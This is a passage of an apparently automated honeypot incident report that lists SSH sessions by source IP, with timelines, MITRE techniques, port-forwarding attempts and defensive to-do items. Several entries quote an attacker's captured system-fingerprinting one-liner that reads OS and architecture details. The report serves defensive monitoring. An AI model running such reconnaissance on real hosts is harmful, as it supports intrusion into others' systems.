| `2026-08-21 05:53:46` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7454e356d5e6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:54 |
| **Last Seen** | 2026-08-21 05:55 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:54:29` | `cowrie.session.connect` |
| `2026-08-21 05:54:30` | `cowrie.client.version` |
| `2026-08-21 05:54:50` | `cowrie.client.kex` |
| `2026-08-21 05:55:00` | `cowrie.login.success` |
| `2026-08-21 05:55:02` | `cowrie.session.params` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.success` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:02` | `cowrie.command.input` |
| `2026-08-21 05:55:03` | `cowrie.log.closed` |
| `2026-08-21 05:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e43f1639e73d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:55 |
| **Last Seen** | 2026-08-21 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:55:47` | `cowrie.session.connect` |
| `2026-08-21 05:55:48` | `cowrie.client.version` |
| `2026-08-21 05:55:48` | `cowrie.client.kex` |
| `2026-08-21 05:55:49` | `cowrie.login.success` |
| `2026-08-21 05:55:50` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:55:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:55:50` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44f07c2888b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 05:55 |
| **Last Seen** | 2026-08-21 05:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:55:52` | `cowrie.session.connect` |
| `2026-08-21 05:55:52` | `cowrie.client.version` |
| `2026-08-21 05:55:52` | `cowrie.client.kex` |
| `2026-08-21 05:55:54` | `cowrie.login.success` |
| `2026-08-21 05:55:54` | `cowrie.direct-tcpip.request` |
| `2026-08-21 05:55:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 05:55:54` | `cowrie.direct-tcpip.data` |
| `2026-08-21 05:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60526392a14

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 05:58 |
| **Last Seen** | 2026-08-21 05:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 05:58:27` | `cowrie.session.connect` |
| `2026-08-21 05:58:28` | `cowrie.client.version` |
| `2026-08-21 05:58:28` | `cowrie.client.kex` |
| `2026-08-21 05:58:30` | `cowrie.login.success` |
| `2026-08-21 05:58:32` | `cowrie.session.params` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.success` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:32` | `cowrie.command.input` |
| `2026-08-21 05:58:33` | `cowrie.log.closed` |
| `2026-08-21 05:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe58ec1ca2a9

| Field | Detail |
|---|---|
| **Source IP** | `104.155.51[.]175` |
| **First Seen** | 2026-08-21 06:01 |
| **Last Seen** | 2026-08-21 06:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:01:32` | `cowrie.session.connect` |
| `2026-08-21 06:01:32` | `cowrie.client.version` |
| `2026-08-21 06:01:32` | `cowrie.client.kex` |
| `2026-08-21 06:01:34` | `cowrie.login.success` |
| `2026-08-21 06:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.51[.]175` to AbuseIPDB if not already reported
- [ ] Block `104.155.51[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-981a98865d70

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:02 |
| **Last Seen** | 2026-08-21 06:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:02:25` | `cowrie.session.connect` |
| `2026-08-21 06:02:26` | `cowrie.client.version` |
| `2026-08-21 06:02:26` | `cowrie.client.kex` |
| `2026-08-21 06:02:31` | `cowrie.login.success` |
| `2026-08-21 06:02:35` | `cowrie.session.params` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.success` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:35` | `cowrie.command.input` |
| `2026-08-21 06:02:36` | `cowrie.log.closed` |
| `2026-08-21 06:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4caff953a383

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:05 |
| **Last Seen** | 2026-08-21 06:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:05:45` | `cowrie.session.connect` |
| `2026-08-21 06:05:45` | `cowrie.client.version` |
| `2026-08-21 06:05:46` | `cowrie.client.kex` |
| `2026-08-21 06:05:47` | `cowrie.login.success` |
| `2026-08-21 06:05:47` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:05:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:05:47` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc541365d01

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:05 |
| **Last Seen** | 2026-08-21 06:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:05:49` | `cowrie.session.connect` |
| `2026-08-21 06:05:49` | `cowrie.client.version` |
| `2026-08-21 06:05:50` | `cowrie.client.kex` |
| `2026-08-21 06:05:52` | `cowrie.login.success` |
| `2026-08-21 06:05:54` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:05:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:05:55` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e8da3bc5c18

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:08 |
| **Last Seen** | 2026-08-21 06:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:08:13` | `cowrie.session.connect` |
| `2026-08-21 06:08:14` | `cowrie.client.version` |
| `2026-08-21 06:08:14` | `cowrie.client.kex` |
| `2026-08-21 06:08:22` | `cowrie.login.success` |
| `2026-08-21 06:08:24` | `cowrie.session.params` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.success` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:24` | `cowrie.command.input` |
| `2026-08-21 06:08:25` | `cowrie.log.closed` |
| `2026-08-21 06:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4383ffc9bd27

| Field | Detail |
|---|---|
| **Source IP** | `209.198.156[.]49` |
| **First Seen** | 2026-08-21 06:11 |
| **Last Seen** | 2026-08-21 06:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:11:44` | `cowrie.session.connect` |
| `2026-08-21 06:11:45` | `cowrie.client.version` |
| `2026-08-21 06:11:45` | `cowrie.client.kex` |
| `2026-08-21 06:11:46` | `cowrie.login.success` |
| `2026-08-21 06:11:47` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.198.156[.]49` to AbuseIPDB if not already reported
- [ ] Block `209.198.156[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-694fdf557291

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:11 |
| **Last Seen** | 2026-08-21 06:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:11:57` | `cowrie.session.connect` |
| `2026-08-21 06:11:58` | `cowrie.client.version` |
| `2026-08-21 06:11:58` | `cowrie.client.kex` |
| `2026-08-21 06:12:02` | `cowrie.login.success` |
| `2026-08-21 06:12:05` | `cowrie.session.params` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.success` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:05` | `cowrie.command.input` |
| `2026-08-21 06:12:06` | `cowrie.log.closed` |
| `2026-08-21 06:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5976f31b9b8f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:15 |
| **Last Seen** | 2026-08-21 06:15 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:15:16` | `cowrie.session.connect` |
| `2026-08-21 06:15:16` | `cowrie.client.version` |
| `2026-08-21 06:15:16` | `cowrie.client.kex` |
| `2026-08-21 06:15:23` | `cowrie.login.success` |
| `2026-08-21 06:15:25` | `cowrie.session.params` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.success` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:25` | `cowrie.command.input` |
| `2026-08-21 06:15:27` | `cowrie.log.closed` |
| `2026-08-21 06:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d76b5b52a1c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:15 |
| **Last Seen** | 2026-08-21 06:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:15:35` | `cowrie.session.connect` |
| `2026-08-21 06:15:35` | `cowrie.client.version` |
| `2026-08-21 06:15:35` | `cowrie.client.kex` |
| `2026-08-21 06:15:36` | `cowrie.login.success` |
| `2026-08-21 06:15:36` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:15:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:15:36` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3cb46b7f695

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:15 |
| **Last Seen** | 2026-08-21 06:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:15:38` | `cowrie.session.connect` |
| `2026-08-21 06:15:38` | `cowrie.client.version` |
| `2026-08-21 06:15:38` | `cowrie.client.kex` |
| `2026-08-21 06:15:40` | `cowrie.login.success` |
| `2026-08-21 06:15:41` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:15:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:15:41` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2254db660899

| Field | Detail |
|---|---|
| **Source IP** | `79.127.3[.]154` |
| **First Seen** | 2026-08-21 06:16 |
| **Last Seen** | 2026-08-21 06:21 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:16:43` | `cowrie.session.connect` |
| `2026-08-21 06:16:43` | `cowrie.client.version` |
| `2026-08-21 06:16:43` | `cowrie.client.kex` |
| `2026-08-21 06:16:46` | `cowrie.login.success` |
| `2026-08-21 06:16:47` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.127.3[.]154` to AbuseIPDB if not already reported
- [ ] Block `79.127.3[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b08d5f5169

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:18 |
| **Last Seen** | 2026-08-21 06:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:18:52` | `cowrie.session.connect` |
| `2026-08-21 06:18:53` | `cowrie.client.version` |
| `2026-08-21 06:18:53` | `cowrie.client.kex` |
| `2026-08-21 06:18:57` | `cowrie.login.success` |
| `2026-08-21 06:18:59` | `cowrie.session.params` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.success` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:18:59` | `cowrie.command.input` |
| `2026-08-21 06:19:00` | `cowrie.log.closed` |
| `2026-08-21 06:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0d6acf99fb

| Field | Detail |
|---|---|
| **Source IP** | `118.123.116[.]93` |
| **First Seen** | 2026-08-21 06:19 |
| **Last Seen** | 2026-08-21 06:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:19:11` | `cowrie.session.connect` |
| `2026-08-21 06:19:12` | `cowrie.client.version` |
| `2026-08-21 06:19:12` | `cowrie.client.kex` |
| `2026-08-21 06:19:14` | `cowrie.login.success` |
| `2026-08-21 06:19:15` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.123.116[.]93` to AbuseIPDB if not already reported
- [ ] Block `118.123.116[.]93` at perimeter firewall / security group
